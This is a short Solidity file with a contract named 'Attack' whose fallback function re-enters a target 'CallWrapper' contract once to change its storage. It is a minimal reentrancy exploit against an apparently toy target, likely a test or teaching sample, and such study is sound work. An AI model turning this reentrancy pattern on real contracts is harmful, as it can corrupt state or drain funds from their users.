contract Attack {
    CallWrapper target;
    bool reentered;

    constructor(address _target) {
        target = CallWrapper(_target);
    }

    function attack() public {
        target.callwrap(address(this));
    }

    fallback() external payable {
        if (!reentered) {
            reentered = true;
            target.modifystorage(1);
        }
    }
}

interface CallWrapperInterface {
    function callwrap(address called) external;
    function modifystorage(uint newdata) external;
}